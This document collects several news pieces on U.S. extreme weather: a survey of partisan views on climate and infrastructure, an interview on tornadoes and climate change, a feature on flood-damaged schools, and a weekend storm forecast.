In most census regional divisions, however, Democrats and Democratic-leaning independents are more likely than Republicans and Republican leaners to report experiencing extreme weather within the past year.

Overall, about half of Democrats (51%) say the area where they live has experienced extreme weather in the past year, compared with a smaller share of Republicans (39%).

A large majority of Democrats and Democratic-leaning independents (85%) say extreme weather events across the country have been occurring more often than in the past. Far fewer Republicans and GOP-leaning independents (44%) say the same; 52% of Republicans instead say such events are happening about as often as in the past.

When asked to think about the government’s role when it comes to building in areas at high risk from major storms, floods and wildfires, 62% of U.S. adults say they are more concerned that government will not go far enough in limiting new construction. A smaller share (33%) say they are more concerned government will go too far in limiting new construction in high-risk areas.

A large majority of Democrats (79%) say their greater concern is that government will not go far enough in limiting construction in areas at high risk for extreme weather.

Views among Republicans tilt in the opposite direction: 53% say they are more concerned that government will go too far in limiting new construction in high-risk areas, while 43% say their greater concern is that government will not go far enough.

Those who say they have experienced extreme weather in their community recently are slightly more likely than those who have not to say their greater concern is that government will not go far enough to limit new construction in high-risk areas, though majorities in both groups take this view (66% and 59%, respectively).

How the public views key infrastructure goals

The survey also asked Americans about different aspects of the country’s infrastructure that the federal government could address. At the top of the list is making structural improvements to roads and bridges: Roughly six-in-ten adults (62%) say this is very important to them personally.

About half (51%) say it is very important for the federal government to build systems to make wastewater reusable in dry regions. Climate scientists expect that climate change will increase the severity of droughts in the future.

The survey also asked about the idea of stricter building standards to better withstand major storms, floods and wildfires – a strategy that could help reduce damaging effects from climate change. Around half of adults (48%) say setting stricter building standards is a very important goal to them, and 37% view this as a somewhat important goal.

Around four-in-ten or more Americans say it is very important to them for the federal government to provide broadband internet access to communities that don’t have it (45%) and to expand public transportation systems (39%).

Only 24% of adults say it is very important for the federal government to build more charging stations to increase the use of electric vehicles receives – the lowest level of public importance for any of the six items in the survey. Around four-in-ten adults (41%) say this is not important, while about a third (34%) say it is somewhat important to them. In an earlier Center survey, just 7% of U.S. adults said they currently own an electric or hybrid vehicle.

Overall, 51% of the public favors the infrastructure bill now being debated in Congress, compared with a smaller share (20%) who oppose it; 29% say they aren’t sure how they feel about it.

Partisanship matters far more than other factors – including where people live – when it comes to Americans’ views about the country’s infrastructure and the government’s role in adaptation to risks from extreme weather.

For instance, 62% of Democrats say it’s a very important goal for the federal government to set stricter standards to better withstand major storms, floods and wildfires. Half as many Republicans (31%) say that is very important to them personally.

There are generally modest differences in views between those who say they have experienced extreme weather locally in the past year and those who say they have not.

That's how Kentucky Gov. Andy Beshear described the series of tornadoes that ripped through several states in the Midwest and South this weekend, transforming homes and businesses into piles of rubble.

Over 100 people are feared dead.

While FEMA administrator Deanne Criswell said events like this would be ""our new normal"" in the age of climate change, President Joe Biden was more cautious on Saturday, telling reporters it's too early to know the specific effect climate change had on this week's storms.

""All that I know is that the intensity of the weather across the board has some impacts as a consequence of the warming of the planet, and the climate change -- the specific impact, on these specific storms, can't say at this point,"" adding he'd be tasking the Environmental Protection Agency and other agencies ""to take a look at that.""

""But the fact is that we all know everything is more intense when the climate is warming everything, and obviously it has some impact here, but I can't give you a quantitative read on that,"" Biden said.

The President's comments underscore the nuance of understanding extreme weather events within the context of climate change. While warming temperatures have unequivocally spawned more intense weather events in the aggregate, linking specific events to climate change can be tricky.

Research on the role that climate change is playing in the formation and intensity of tornadoes is not as robust as for other types of extreme weather like droughts, floods and even hurricanes. The nature of tornadoes, along with an extremely spotty and unreliable historical record for them, makes drawing connections to long-term, human-caused climate change very difficult.

While establishing connections between climate change and tornadoes is difficult, the correlation between El Niño/La Niña and tornadoes is strong. La Niña seasons tend to have increased tornado activity in the US, and it is worth noting that the US is currently experiencing La Niña, which is expected to last into spring of next year.

For help understanding the role of climate change in extreme weather events, we turned to Scott Sklar , the energy director of George Washington University's Environment & Energy Management Institute. Our conversation, which has been lightly edited for length and clarity, is below.

CNN: Can you explain the relationship between what we know about climate change and the formation of tornadoes. And also the connection between climate change and extreme weather events more generally?

SS: First of all, there have been many different studies on severe weather in the aggregate. And we're talking about flooding, ocean surges, forest fires and hurricane intensity. So we have some very good documentation, many peer-reviewed studies on all of that.

What we don't have is something comparable with tornadoes. What we do know is we're not getting more tornadoes, but we do know that hot weather helps spawn tornadoes, particularly when there's a meeting of hot and cold fronts coming together. They cause swirls and that's very well-known and documented. And in this case of the horrible tornadoes -- the tornado, the longest one so far in history -- we do know that it was in the 70s to near 80s Friday afternoon. And that is very out of character for December in that area.

So what we know about tornadoes is that while we're not getting more tornadoes, they're clumping together in certain timeframes, and this is one of the timeframes they're starting to clump together. And that's all we know. We really don't know the science really behind that or what's causing that or whether that could just be an aberration at this point. But we do know hotter temperatures do create that formation period for tornadoes. And we are getting those hot temperatures.

CNN: President Joe Biden said this weekend it's too early to know whether these tornadoes were spawned by climate change but that he would ask the Environmental Protection Agency to assess. What goes into an assessment like that?

SS: They're going to tap into other federal agencies like the National Oceanic and Atmospheric Administration, which sits within the Department of Commerce. NASA, they have a weather science group, and they're going to pull all the existing data together of the day before to present and take a look at those conditions in much more detail. Then they're going to bring in a meteorologist not only from the federal government, from the different universities that study different parts of that, both Environmental Protection Agency laboratories, national laboratories and other federal laboratories, and just look at that data and see if anything, you know, fits these criteria that we know.

And I just have to say, we don't have enough science at the moment on tornadoes. We really haven't looked in detail on climate on tornadoes. So I want to be clear that we don't know if climate change created this situation at the moment, but we also don't know if it didn't. And so it's just where we are scientifically.

CNN: So how do you get people to feel the urgency of climate change when linking it to specific weather tragedies can be quite nuanced?

SS: The National Oceanic and Atmospheric Administration The National Oceanic and Atmospheric Administration puts out these great maps of extreme weather events that cost over $1 billion every year. I put them on slides for my students, and it's sobering to see what's happened over the last 20, 25 years in that we started with maybe one or two events and now we're averaging seven to 12 events a year.

So we know extreme events are just happening more frequently. We also know, again, that ocean surges, flooding, hurricanes and these extreme forest fires are absolutely related to climate change. So we know that those events that have been on the news -- including extreme cold snaps in Texas, which brought down the entire Texas grid -- were related to extremes in climate, extreme patterns. And so that's what we know. Part of it is to say, 'Okay, we're seeing these more extreme events, even if it were not related to climate, we need to prepare for those extreme events.'

So that's one of the issues I tell people -- even, for some reason, if you don't think the preponderance of scientific evidence makes any sense, we do know we're having more extreme events. And so we are going as a country, and of course as a world, to prepare for them -- things that we have not had to prepare for before. And that includes how we zone on where we put buildings, how we build buildings, how we build roadways, how we harden our infrastructure. Every time we get a high wind, like we did in this area in Northern Virginia last night, people are not sitting there without power in the winter or the summer, in particular. We have a lot of work to do.

But I'm here to say that these are very sobering statistics, and they're not coincidental. And so that is the issue we're dealing with.

CNN: There always seems to be some climate change discussion in the wake of horrific events. You mentioned the Texas energy grid, but how do you sustain the urgency of that discussion beyond an extreme weather event?

SS: That's why having these kind of maps put out by different scientific agencies is so important. It's staggering when you take a look at the history of extreme events and what's happening in my lifetime.

But you know, the other thing is we need to be careful. I really believe some of the pushback on this is the average human being says, 'Okay, I may believe in it, but I'm sort of at wit's end to say what do I really do with that? And I'm being told so many different things and it's confusing and overwhelming to me.'

And so that's the other part of this -- to create some concrete action that allows people to feel they're moving the needle without being told there are a hundred different things they have to do and just getting overwhelmed and shutting it out.

CNN: I suppose that's the heart of the issue, boiling down a global problem into something individuals can take concrete steps to address?

SS: What I have been doing as an educator is going to local governments and saying, 'Look, you know, part of this is to take a look at things that are not only doable, but save people money at the same time.'

So, you know, weatherizing your home, buying appliances more efficiently so they're just using less energy -- because it's always less expensive to save energy than generate it from any source. So let's focus on the things people can do to save money, because that's a great thing to have more disposable income. And if that has a major impact on climate, that's the perfect juxtaposition of doing things for economic value and climate value.

I think we need to start looking at those things and just not overwhelming folks that are trying to work, and provide for their families, and deal with their health issues and all sorts of things.",Extreme Weather,2021-12-13 08:00:00

Debris in a classroom at Waverly Elementary School in Waverly, Tenn. (Wade Payne for The Washington Post)

Share this story

When last summer’s devastating flood put the town of Waverly, Tenn., underwater, Richard Rye was standing on the roof of the junior high school. The junior high school where, if it had not been a Saturday morning, entire classrooms of kids would have been submerged in five feet of water as a rising swell pushed through the building, ripping heavy doors off their hinges and turning hallways into rivers, desks bobbing in the current like paper cups.

Rye, the director of schools for Humphreys County, stood on that roof for hours and watched first neighboring Waverly Elementary and then Waverly Junior High School, buildings that housed 1,100 total students on any given weekday, fill with water. All he could think was: What am I going to do?

The forecast had showed only a few inches of rain. And Waverly, a rural town with a smaller-than-average Walmart, a few fast-food chains, an AutoZone and not much else, wasn’t seen as a cosmic center of extreme weather. On the night before the flood, many people, including Rye, had sat under the Friday night lights cheering on the high school football team, the Tigers. When the Tigers won, the rain had not yet started to fall.

Then, early on the morning of Aug. 21, Rye woke to a text message from the elementary school principal alerting him that Trace Creek, which winds its way through Waverly, had started rising.

Climate news is relentlessly, objectively grim. Should we ever allow ourselves to feel optimism? Read more After a devastating wildfire, a California community faced another crisis: PTSD Read more Picture where you are right now and imagine taking 30 or so long steps. That’s the distance from one corner of the school to the water’s edge. That had always worried Rye, especially since the elementary and junior high schools sat in a low-lying area. When he took over as director in July 2020, they had already flooded twice, in 2010 and 2019. Rye had started to build a raised-dirt berm around the buildings in hopes of keeping flooding at bay — the best he could do with limited resources. By 7:45 a.m. that Saturday, Rye was in his gray Ford Explorer headed to the schools. Within an hour, Rye and a bus mechanic had loaded a truck bed full of sandbags and were beginning to place them around the perimeter of the elementary and junior high buildings. Water lapped around their ankles. A few minutes later, the water was at their knees, then at their waists. The strength of the water threatened Rye’s balance and felt, he remembers, “like a tsunami.” That’s when Rye, along with a few others who were at the campus, opened a supply closet, got a ladder and climbed to the roof.

The flood proved catastrophic, dumping at least 17 inches on the area, damaging more than 600 homes and killing 20 people, including three students: a second-grader, a high school freshman and a high school sophomore. But the gravity of what Rye faced in its aftermath made it worse still. Put the children back in the flood basin? If not that, then where?

It’s a question more school officials will need to answer in the coming years. In January the U.S. Government Accountability Office released a report on the impacts of weather and climate disasters on schools, finding that “Over one-half of public school districts [are] in counties that experienced presidentially-declared major disasters from 2017 to 2019. These school districts included over two-thirds of all students across the country.” It’s a big number that is likely not big enough; the country has seen only larger and more widespread climate catastrophes in the years following the report. The year 2020 holds the record for the most “billion-dollar” weather and climate disasters since the National Oceanic and Atmospheric Administration’s National Centers for Environmental Information began keeping track. The second highest year was 2021.

In the West, wildfires are turning schools to ash-paste; in the South, floods are the ever-present threat. It’s a threat that is growing larger, yet is often overlooked, especially in rural communities. There, it’s not just hurricanes washing away neighborhoods, but inland flooding, a phenomenon that happens when smaller bodies of water become overwhelmed by increasing precipitation. A 2017 report by the Pew Charitable Trusts found that nearly 6,500 public schools are in counties at a high risk of flooding, and that number is rapidly multiplying; a study published in Nature in January found that the nation’s flood risk will jump 26 percent in the next three decades.

The country’s public school infrastructure is no match for apocalyptic weather, and little is being done to prepare. Inaction on the part of school boards and administrators has already had negative consequences. The lack of investment and planning around educational facilities has meant that extreme-weather events routinely shutter buildings and keep kids out of school, which disturbs their grades, mental health and stability of their communities. There’s no question that schools are being affected. But how we can make sure they survive?

Destruction from climate disasters is just one of many problems facing public school buildings. In the 2021 Report Card for America’s Infrastructure — data released every four years by the American Society of Civil Engineers — school buildings were given the grade of D-plus. Of the approximately 84,000 public schools in the United States, 4 in 10 don’t have a long-term facility plan, the report states. Over half of public-school districts report the need to upgrade or replace multiple buildings as well as HVAC systems, and more than one-third of public schools have students in portable buildings of which nearly half are in poor or fair condition. A separate report last year warned that “the state of our schools is a national emergency” and found that infrastructure improvements were underfunded by $85 billion.

This is in part because schools are largely funded through local taxes — and raising them is never a popular idea. But it does not speak well for the United States that one of the most unsafe places are the buildings where we send our children every day. “We take schools for granted and just always expect them to be there,” says Jennifer Seydel, executive director of the Green Schools National Network, an organization that provides resources and coaching to schools and school boards that want to become more sustainable. “From school facilities and operations to architects and designers that are working with schools — they are just not thinking about climate events, like flooding, and how it might affect a school.”

And schools are routinely affected. Late last summer, the biblical rains of Hurricane Ida forced the closure of dozens of schools in Louisiana — some of them permanent. The storm swung north and east, flooding a string of schools as far as Pennsylvania. In areas suffocated with wildfire smoke, there are schools without air filtration, and others are getting increasingly hotter without proper air conditioning, which has kept kids out of the classroom in cities from Baltimore to Denver.

“The education sector has not been vocal in its role to address climate change,” says Laura Schifter, a senior fellow at the Aspen Institute, where she leads K12 Climate Action, an initiative to advance climate-friendly practices and policies within schools. “Public schools manage over 2 million acres of land. There’s a huge critical need for schools to be climate resilient as they continue to be disrupted by climate events.”

In the 2021 Report Card for America’s Infrastructure — data released every four years by the American Society of Civil Engineers — school buildings were given the grade of D-plus. These disruptions mean missed school days, and excessive absences create a cascade of problems for students. You can see it in their grades and test scores: According to one study published in the American Economic Journal in May 2020, students who routinely experienced hotter classroom temperatures had lower PSAT scores than their peers at schools that didn’t experience as many hot days. Researchers found that a large fraction of the disparity may be attributable to differences in school air conditioning and that schools without AC may have been more likely to cancel classes on hot days. You can see it in their mental health, physical health and general well-being, too. “Any disruption in one’s schooling, as has occurred with the pandemic, which has definite links and parallels to the climate crisis, or with acute disasters … has a direct impact on a child’s development,” says David Pollack, a founding member of the Climate Psychiatry Alliance and professor emeritus for public policy at Oregon Health and Science University. Emily Diamond, a researcher focused on health inequalities and a professor of clinical psychology at the Wright Institute in Berkeley, Calif., found that children who experienced an extreme weather event were more likely to have future medical conditions severe enough to limit everyday activities. And sitting in classrooms with mold particles post-flood can mean a higher risk for things like asthma and other lifelong conditions that can result from it, she explains. “And all this is happening at a time when what you really hope for is that children fall in love with life,” Diamond says. The best-case scenario is also an impossible one: Many public school buildings need to be rebuilt, moved or significantly retrofitted. At a minimum, that will take time. Until then, we should at least make sure that students don’t miss so many days because of a climate event, says Kevin Kupietz, a chair of the department of aviation and emergency management at Elizabeth City State University in North Carolina.

The way to do this is through national learn-at-home drills, Kupietz says. Which sounds a lot like remote schooling, except his plan goes further. He doesn’t want to simply create plug-and-play virtual learning; he wants to react to what students need if they can’t be in the classroom. “The idea isn’t just that students are staying home to do their work,” he explains. “It’s really about schools using it as a learning opportunity to determine who had technology problems, what were the administrator issues, who didn’t have access to the materials they needed.” This could look like WiFi parking lots set up by the school so students have access to the Internet and better integration of educational curriculum into storm shelters.

Kupietz acknowledges that it’s “an imperfect solution to an imperfect problem” — we all know the pitfalls of learning from home thanks to the pandemic — but says doing nothing would be worse. “When a student has to stop learning, even for a day, it takes a lot of energy to get that boulder moving again,” he says, with low-income families, minorities and children with disabilities being affected more greatly. “This isn’t just keeping the gaps open that we currently already have in underserved communities; it’s widening them.

By the time I meet Rye in Tennessee in mid-February, six months after the flood, the students have long been back in class. “We know that being out of school is just not good for kids — socially, mentally, there’s a whole list of things,” he says. “For some kids this is the only place they get a decent meal.”

But they are not back in the schools that flooded. Rye walks me through the now-empty buildings, the air aquatic and heavy with the smell of mildew. In a few weeks when it warms up, Rye tells me, the walls will grow fertile with mold. There is a gum of decay on everything, a layer of dirt on the ground, mounds of dried leaves in the basins of water fountains and sticking to still-open lockers. Everything once-waterlogged still sits bloated. At times, the destruction is so severe — blown-out walls, collapsing ceilings — it’s hard to fathom what I’m looking at.

There are black lines on the walls that show how high the water came up. Rye, at nearly 6 feet tall and solidly built, stands next to them; the water would have been at his ears. “If the flood had happened on a Friday, just 24 hours earlier, we would have lost a lot of lives that day: children’s lives, staff lives, the lives of parents who would have tried to get to their children,” he says. The thought snags in his mind at night, keeping him awake.

“That’s why, before I had a funding source, before I even knew what exactly I was going to do, I announced that I would never put kids back in this flood basin,” Rye says. “The school could get another director before I would do it. Parents trust me to take care of their kids when they’re in school. I take that very seriously. The risk is not worth it because there will be another flood. If that happens, and we rebuild in a flood zone, we won’t have any kids left.”

Currently, that means about 1,000 students have been absorbed into other school buildings, including the high school (which also had minor flooding that day) and two farther-away campuses. These are not ideal circumstances, Rye admits: There are kids “stacked on top of each other,” kids learning in closets, classrooms crammed on an auditorium stage. For some kids, bus rides last hours; they leave school at 2:15 p.m., with the last kids getting dropped at home by 5.

By August, Rye hopes to complete renovations on a 79,000-square-foot former boot factory that sits on high ground. It will hold the students of Waverly Elementary and Waverly Junior High until he can secure a piece of land that isn’t in a flood zone and rebuild the two schools. “We’re doing the best we can in a tough situation,” he says. “When your back is against the wall, you do things you didn’t think you could do. It has been a struggle to find a site for the new schools, but we need to do it right. These schools need to last us. They need to be safe.”

There are no borders in the climate crisis: A fire on your neighbor’s hillside means a burning ember on your lawn. A flood in a neighboring town means a wash of problems in yours. Climate change strikes not with a bull’s eye, but with an effect that spreads and metastasizes and permeates, which puts a strain on school buildings in a different way.

This is what I hear on a crisp Friday morning as I stand with a group of parents in the parking lot of the now-abandoned Guideway Elementary in Tabor City, N.C. It’s a rural community some 40 miles inland of the Atlantic Ocean, where there is a family-owned grocery store, a handful of churches, and an RV park and campground that sits next to a winery — but no school. The low-slung brick building that once housed pre-K through fifth grade was shut down by the Columbus County School Board in 2020.

In 2016, Tabor City and the surrounding area were hit by Hurricane Matthew, and then again two years later by Hurricane Florence. Guideway Elementary didn’t flood (although its roof had some water damage), but it sits in a flood-plain county. There doesn’t need to be a major storm for extreme weather to have an impact: Excessive rain alone is enough to cause rivers and tributaries and cypress swamps to swell.

Fair Bluff, a community at the far end of Columbus County, was particularly devastated after the hurricanes. After two weeks underwater, most of the town was destroyed, including almost one-third of the town’s homes. The population fell by half, so even after the floodwaters receded, many businesses never reopened.

There are no borders in the climate crisis: A fire on your neighbor’s hillside means a burning ember on your lawn. Along Main Street, the innards of a climate ghost town sit suspended in time. The doors of long-gone businesses stand ajar, revealing dust-covered shelves with items still inside. Buildings collapse on themselves and breed snakes. When I ask the cashier at the dollar store if she could point me in the direction of families who have stayed that I might talk to, she tells me she would but just doesn’t know of any. The exodus there, and in other flood-prone parts of the county, has affected the ability to keep schools open, both in terms of the cost to operate half-empty schools and the loss of a tax base that helps fund them. “Our school district has been impacted by flooding and the hurricanes, especially Fair Bluff,” says Deanne Meadows, superintendent of Columbus County Schools. “Their population declined so significantly that it impacted the student population of schools in that area.” Meadows tells me that, on average, the county has lost about 100 students a year. It used to have about 6,500 students; in the past decade the number has dropped closer to 5,000. In the next few years, there are plans to close four more — two pre-K-through-eighth-grade schools, as well as one elementary and one middle school — to condense them into two new pre-K-through-eighth-grade schools. “We didn’t have a lot of population displacement in our school specifically, but we became a victim of it,” says Tony Ransom, whose son and daughter went to Guideway. He did, too, along with his mother and grandmother. When Guideway closed, he said, “it felt like the heart of our community was cut out.” When a house is gone, one family is affected; when a school is gone, every family in the community is affected. “Physical spaces are our social infrastructure,” says Amy Chester, a managing director of Rebuild by Design, an organization helping local governments build communities that can withstand climate challenges. “A neighborhood school may be where students eat two meals a day, get their exercise by joining a team that meets there on the weekends, and in times of crisis, can turn into a shelter. When a physical space that brought people together is no longer there, neither is the bond that gives community members a way to get to know their neighbors.” These are some of the stories I heard about Guideway from parents: Once when a family was struggling, teachers showed up at their house with Bojangles chicken to make sure the kids had food to eat. Before holiday break, teachers would give every single student a gift. Teachers would text parents cute things their kids did during the day. With all the violence in schools, no one even thought about it — teachers would have died before they let anything happen to those kids.

“The kind of nurturing environment that students had here cannot be replaced,” says Melanie Glagola, whose son went to kindergarten at Guideway. “He struggled a lot with going to a new school. He was having a really hard time and didn’t want to go to school in the morning. We had to put the child locks on the car door. ... He was freaking out. He would try to take his seat belt off while driving down the road. He would be crying and crying. That never happened at Guideway. He loved going to school every day.”

Ransom’s children, both now in sixth grade, have largely adjusted to their new school, which is about 15 minutes from Guideway, but their grades have gone down. Others are having a harder time, with former Guideway parents telling me they’ve heard of students being bullied at their new school, of kindergartners who have to get on the bus super early in the morning, of parents who took their kids out of school to home-school. The details are unclear, since many families don’t see one another anymore. “I think there were definitely kids that fell through the cracks,” says Glagola. “We know of at least one family that had a lot of problems at home, and it was the teachers at Guideway that cared about them.”

That Guideway closed is one frustration to parents. Where the students were sent is another. Guideway was a storm shelter designated by the Federal Emergency Management Agency, making it one of the safest places in the community in the event of a hurricane or severe flooding. One of the schools where students go now is in a flood plain. “They are not thinking of future floods in deciding where to put the kids,” Ransom says. “When the next storm comes, I fear something bad is going to happen.”

Adds Glagola: “During the public discussions and school board meetings, the concern about how the other schools flood was something I heard brought up a lot. People would ask, why are you picking to close Guideway, then? I never really heard a response to that.”

In an emailed response to me, Meadows wrote: “We do look at the areas that flood to avoid for actual school sites. We look at where it is believed that growth will occur in the communities when making the decisions. We cannot always predict those events, so it may be tough to use that information.”

Some school administrators are actively working to solve these problems — with progress being made from even five years ago, experts told me. Many pointed me to the gold standard for how schools can adapt to climate change, which is just over 300 miles from Tabor City: Virginia Beach City Public Schools.

A part of Virginia hangs off the East Coast, surrounded by the Atlantic Ocean, Chesapeake Bay and various waterways — which puts it on the front lines of flooding. “I am worried about the big one,” says Kim Sudderth, a Virginia Beach community organizer for Mothers Out Front, an organization mobilizing parents around the climate crisis. “The big one,” she explains, is a storm system that would drop so much rain on the coastal communities of Virginia Beach that the area doesn’t bounce back. Practically everyone in Virginia Beach knows someone who has lost a car to water damage, she tells me. It’s not uncommon for some students to miss as much as a month of school, including for weather-related issues — like a road that’s impassable due to flooding.

The sustainability officer for the school district is Tim Cole, who’s not the prototypical eco-advocate. He spent 17 years as a Navy SEAL. He didn’t always care about climate change. He didn’t care if his groceries were bagged in plastic.

That changed in 2006. Cole was sitting outside of Baghdad with the sound of gunfire in the background, thinking of all the ways his life had been put in danger: helicopter crashes, parachute malfunctions, being shot at, dragged through the woods by a bear. He realized that the threat his children, and their children, would face is something much bigger. “It really didn’t dawn on me, the impact of all of this stuff,” he explains to me. “I began looking at climate change in terms of how we could solve this big problem. We’re on this rock hurtling through space. It’s like a spaceship that we haven’t done a good job at taking care of … so how are we going to adjust and fix this life-support system?”

“If you go into any area, schools are typically the largest landowner,” says Tim Cole, sustainability officer with Virginia Beach City Public Schools. “It’s critical for schools to lead by example.” In his role for Virginia Beach public schools, Cole has helped lead the construction of 13 LEED-certified schools, meaning they meet a rigorous set of green design principles, with an additional school under construction and design plans underway for three more. In total, the district has 86 schools, and in February 2009, the school board adopted a policy that requires all new buildings to be designed and built to LEED standards, featuring solar hot water, natural lighting, teaching gardens, outdoor learning spaces and indoor forested zones. What’s particularly compelling is how the buildings handle storm-water drainage, through cylinder-like chambers buried under parking lots, allowing water to flow into the tanks, where it is released back into the water table. Additionally, rainwater is captured and used to flush toilets. Already the measures have prevented the buildings from flooding over the past few years. “If you go into any area, schools are typically the largest landowner,” Cole says. “It’s critical for schools to lead by example. You build these buildings, and the community sees what you’re doing. And for students, it becomes a tangible teaching tool.” As to how he’s been able to get his conservative community onboard, in the book “Trailblazers for Whole School Sustainability: Case Studies of Educators in Action,” which features a piece by Cole, he writes: “You approach it like a special ops guy. Introducing sustainability into an organization is comparable to guerrilla warfare. You are dropped into a hostile environment. You are severely outnumbered and have limited resources as your disposal. So, you begin to recruit allies. You nurture these relationships, and you steadily win hearts and minds through your successes.” The Virginia Beach district’s successes include reduced asthma rates and respiratory-related illnesses among students due to improved indoor air quality and a decrease in energy consumption by 27 percent, which has saved money. “We’re never going to get where we need to be by approaching this one school at a time,” Cole says. “My goal is to build a model for others to follow.” Diane Regas, president and chief executive for the nonprofit Trust for Public Land, says there are smaller things a school can do, too. Her organization works to connect people with the outdoors, including through an initiative that works with schools to make playgrounds green and help address issues like flooding. “These schoolyards are solutions hiding in plain sight,” she says. “You can think about this as climate change, but you can also just think of it as a way to make our schools better.” For instance, at a school in Philadelphia that Regas’s program worked with to design playgrounds and a rain garden that would absorb water, the principal told her that suspension rates had dropped to zero following the installations and stayed that way for at least three years. While Regas acknowledges that it is impossible to calculate exactly how much the improvements affected suspension rates, it is possible to see more broadly how climate issues often intersect with racial and socioeconomic ones.

Other easier-to-implement ideas include moving all heating and cooling systems out of basements and into higher floors, as well as creating sunken basketball courts to hold water. Of course, these adaptation strategies focus on floods, but there are an equal number of measures for other extreme weather events. To protect against the effects of wildfires, for instance, schools can create a defensible space around their buildings or install better air filtration systems to deal with smoke.

How this all gets paid for is a knotty question. School funding varies significantly, all the way down to the local level. (The Virginia Beach projects are primarily funded through local taxes. In Waverly, FEMA is covering the cost.)

Some experts believe corporate reparations could help, while others think the federal government should take on a bigger financial role. President Biden’s infrastructure package, signed into law in November, no longer includes schools, but other bills could help, including the Green New Deal for Public Schools introduced by Rep. Jamaal Bowman of New York. His proposed investment of $1.4 trillion dollars over 10 years would allow for improvements to existing schools and the reimagining of how future schools are built. “Our kids need to graduate,” says Bowman, a Democrat. “But schools across the country are physically falling apart and are unhealthy and unsafe for kids. It’s on the federal government to make investments in school infrastructure and save us from ourselves.” Garnering support has been slow; the bill has 65 co-sponsors but will need 218 votes to pass.

The expense is worth it, experts say. A 2020 National Institute of Building Sciences report found that for every dollar invested in climate mitigation strategies when building, $13 would be saved.

“The costs will only go up the longer we wait,” says Gernot Wagner, a climate economist at Columbia Business School. “And there are real costs, traumatic costs, in putting this off. The people who are most vulnerable are the kids.”

Rebuilding a school doesn’t just require money — it also takes the knowledge and understanding that it needs to be rebuilt or better adapted to withstand the pressure of climate events in the first place. That requires educating the next generation on the challenges they will face because of climate change.

But that’s not happening. At least, not equally. A 2020 National Center for Science Education study gave nearly half of all states a C or worse when it came to their offering of a comprehensive climate curriculum. (Six received an F: Alabama, Georgia, Pennsylvania, South Carolina, Texas and Virginia.) In some districts, educators are using materials offered by the Heartland Institute, an organization that provides textbooks to teachers that cast doubt on climate science.

“Climate change is worsening, but there’s a lot of silence from the education sector,” says Nancy Metzger-Carter, a sustainability curriculum coordinator at Sonoma Academy, a K-12 school in Northern California, and leader of Schools for Climate Action, a youth-led campaign whose mission is to get schools to address climate change. “While there has been progress in the adoption of climate education, only 20 states have adopted the Next Generation Science Standards, which I consider the bare-minimum entry point to prepare students for a future which will require a level of systems innovation … never seen before,” Metzger-Carter wrote in an email after our phone call. “Climate change, if it exists in curriculum, is mostly stuck in science classrooms. I also fear the deepening polarization we are seeing play out at school board meetings, which will also impact the momentum for comprehensive climate education.” So far, New Jersey is the only state that has comprehensive, interdisciplinary K-12 climate education standards, she told me.

Lisa Kensler, a professor in educational leadership at Auburn University, whose focus is on teaching school leaders about leading with sustainability in mind and how to integrate these topics into their schools’ teaching practices, tells me: “School infrastructure problems and climate change problems are, at their core, educational challenges.” If we aren’t properly preparing the next generation about the problems of the climate crisis and how to fix them, our buildings will continue to be weak to the challenges of disasters. To borrow a construction metaphor: You can’t build a strong structure on a shaky foundation.

I ask Kensler how many programs are doing work like this. There are some teacher preparation programs, she says. But when it comes to administration-level programs, the types that will train the people who are often responsible for making high-level decisions on public school curriculum, and building design and management, well, “There’s only one: me.”

On my last day in Tennessee’s middle country, as I drive my rental car back to the airport, a flood warning flashes on my phone. The winter rain starts coming down so heavily it’s hard to see the road. I wonder about the water levels of Trace Creek and message Rye.

So far, the creek is bloated but hasn’t breached its banks. But things can change in an ordinary instant. Rye knows this. And so, he writes to me, schools are closed today.

""Both winter weather and severe weather possible to kick off the new year this weekend,"" the Weather Prediction Center (WPC) said in its forecast discussion

As a cold front pushes its way into spring-like warmth all week over the southern states, it will help fuel strong to severe thunderstorms across the area.

""There is a moderate risk of excessive rainfall and an enhanced risk of severe thunderstorms over parts of the Ohio, Tennessee, and Lower Mississippi Valleys from Saturday into Sunday morning,"" the WPC also said

The weekend is also forecast to start off with measurable snowfall and an icy wintry mix that are expected to cause widespread hazardous travel conditions on New Year's Day from the Central Plains to the Great Lakes.

Another round of severe storms

On the warm side of the front, ample moisture will help support storms capable of all severe weather hazards including large hail, damaging winds, flooding, frequent lightning, and tornadoes.

Kentucky Gov. Andy Beshear on Saturday declared a State of Emergency due to severe rain, thunderstorms, tornadoes and strong winds across the state.

""It is devastating that we are once again experiencing severe weather just weeks after the deadly tornadoes hit Western Kentucky. Sadly, some counties have been affected by both of these events,"" Beshear said in a press release.

""We will continue to monitor the weather and provide needed updates. Everyone be aware, stay safe and seek shelter when advised.""

Central Alabama, including the cities of Birmingham and Tuscaloosa, are under a tornado watch until 10 p.m. CST according to the Storm Prediction Center (SPC).

Severe storms are expected to develop through the afternoon and evening.

As they move through central Alabama, these storms have the potential to produce tornadoes, some of which could be strong, noted SPC. Additionally, these storms may produce damaging wind gusts up to 70 mph and large hail.

The SPC also issued a tornado watch for portions of southeast Arkansas, northern Louisiana and central Mississippi until 8 pm CST.

And a tornado watch is in effect for northern Alabama, northern Georgia, western North Carolina and eastern Tennessee until 3 am EST, according to the SPC.

Clusters of severe storms containing embedded supercells will continue to quickly spread in the region through the late evening and early overnight hours.

These storms may produce tornadoes, some of which could be intense, noted SPC. Additionally, these storms may produce damaging wind gusts up to 70 mph.

Storms developing in these areas have the potential to produce damaging wind gusts up to 80 mph, SPC said. Storms in Arkansas, Louisiana and Mississippi have the potential to produce hail nearly the size of golf balls.

Flooding will also be a major concern, especially across Kentucky, where cleanup is still ongoing from the tornadoes that ripped through the western part of the state nearly three weeks ago.

A flood warning remains in effect until 8 a.m. Sunday in portions of Western Kentucky as streams continue to rise due to excess runoff from earlier rainfall, according to the National Weather Service (NWS).

""It will take several hours for all the water from these storms to work through local drainage systems in urban areas,"" the warning said.

Between 2 and 4.5 inches of rain have already fallen and additional rainfall amounts of possibly a half an inch are possible.

Flood watches are in effect from eastern Oklahoma all the way through West Virginia.

Widespread rain totals of 1-3 inches are expected from western Arkansas to western Pennsylvania. Kentucky could see the highest amounts, up to 4 inches through the weekend.

Given that the ground is already saturated across Arkansas, Kentucky, and Tennessee, flooding and flash flooding could be likely, forecasters said.

New year, new (colder) weather

After an incredibly warm December for much of the US, the new year may bring the first prolonged taste of winter for some states.

This could be the first significant snow event of the season for the Midwest, with widespread snowfall accumulations of 4 inches possible from eastern Kansas to Lake Michigan.

Heavier snow bands could result in even higher amounts of 6-8 inches or more along the Iowa/Missouri border and northern Illinois, resulting in widespread travel disruptions.

